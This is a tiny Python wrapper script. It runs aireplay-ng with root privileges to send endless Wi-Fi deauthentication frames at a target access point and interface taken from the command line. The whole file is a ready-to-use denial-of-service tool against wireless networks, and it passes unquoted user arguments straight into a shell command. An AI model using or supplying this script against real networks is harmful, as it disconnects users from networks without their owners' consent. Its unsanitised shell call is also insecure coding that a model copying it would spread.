import os
import sys
try:
    sys.argv[1]
    sys.argv[2]
except:
    print('Error! Not enough launch options.')
    sys.exit()
os.system('sudo aireplay-ng --deauth 0 -a {} {}'.format(str(sys.argv[1]), str(sys.argv[2])))